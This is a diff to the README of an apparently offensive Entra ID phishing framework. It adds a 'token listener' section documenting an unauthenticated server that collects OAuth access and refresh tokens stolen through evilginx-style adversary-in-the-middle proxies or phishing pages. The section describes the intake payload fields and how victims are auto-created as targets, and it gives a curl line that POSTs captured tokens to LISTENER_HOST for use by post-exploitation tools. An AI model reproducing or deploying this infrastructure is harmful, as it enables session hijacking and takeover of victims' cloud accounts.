@@ -48,6 +48,11 @@ campaign.require_mfa  = false        # force MFA during the device-code auth
 # Storage (created automatically if missing)
 storage.artifacts_path = /opt/entraith/data/artifacts
 storage.exports_path   = /opt/entraith/data/exports
+
+# Token listener (optional) — standalone OAuth token intake server
+listener.token_port       = 8000     # intake port (default 8000)
+listener.token_autostart  = false    # start the intake server at boot
+listener.default_campaign =          # campaign for tokens without a campaign_id
 ```
 
 The SQLite database is created at `<parent of artifacts_path>/entraith.db`.
@@ -226,6 +231,57 @@ Both modes share the same log file. The standalone listener state is in-memory o
 ```
 
 The **Broker** tab polls `GET /webhook/logs` and renders the last 100 entries as formatted cards showing timestamp, source IP, HTTP method, path, and syntax-highlighted JSON payload.
+
+---
+
+## Token listener
+
+The token listener is a **standalone HTTP server**, separate from both the operator console and the webhook/broker listener, that receives OAuth tokens pushed in from an external source — an AiTM / reverse proxy (evilginx-style), a phishing landing page, or a manual drop — and **ingests them into a campaign**. An ingested token is stored exactly like a device-code capture (in memory + encrypted at rest in the database), so it shows up under the campaign's **Tokens** tab and is immediately usable by every post-exploitation tool (Graph, MFA, PRT, token exchange).
+
+Configure it with the `listener.*` keys above, or drive it at runtime from the **Broker** tab (the *Token Listener* panel) or the control API.
+
+### Intake endpoint
+
+The intake server listens on its own port (default `8000`) and exposes:
+
+| Method | Path | Purpose |
+|--------|------|---------|
+| `POST` | `/token` (or any path) | Ingest one token payload |
+| `GET`  | `/health` | Liveness probe |
+
+The intake endpoint is **unauthenticated by design** — the whole point is that an external component can POST to it. Bind it to an interface/port that only your infrastructure can reach, or front it with a redirector.
+
+### Payload
+
+`POST /token` accepts either `application/json` (default) or `application/x-www-form-urlencoded`, selected by `Content-Type`. Fields:
+
+| Field | Required | Notes |
+|-------|----------|-------|
+| `access_token` / `refresh_token` / `id_token` | at least one | Captured token material |
+| `token_type`, `expires_in`, `scope` | no | Copied through as-is |
+| `campaign_id` | no* | Target campaign; falls back to `listener.default_campaign` |
+| `target_id` / `target_email` | no | Match an existing target; otherwise a target is auto-created |
+| `source` | no | Free-form origin label (e.g. `aitm`, `phish-page`) |
+
+\* A `campaign_id` (in the payload) or a configured `default_campaign` is required — otherwise the token is rejected with `400` and logged as `no_campaign`.
+
+**Target resolution:** `target_id` match → `target_email` (or the UPN/email from the JWT) match → auto-create a new target (group `captured`) from the JWT's `upn`/`preferred_username`/`email` and `tid` claims.
+
+Example (evilginx / AiTM style):
+
+```bash
+curl -X POST http://LISTENER_HOST:8000/token \
+  -H 'Content-Type: application/json' \
+  -d '{"access_token":"eyJ...","refresh_token":"0.AX...","campaign_id":"camp-123","source":"aitm"}'
+```
+
+### Audit log
+
+Every intake attempt is written to `token_listener.log` under `storage.artifacts_path` as a `token_ingest` entry. Token material is **redacted** in this log — only a short prefix and length are recorded (`eyJhbGciOiAi…(len=308)`); the usable token lives encrypted at rest in the database, never in the plaintext log.
+
+### State
+
+The listener state (running/port/counters) is in-memory only. After a server restart it is stopped unless `listener.token_autostart = true`. Already-ingested tokens survive the restart because they are persisted to the database.
 
 ---
 
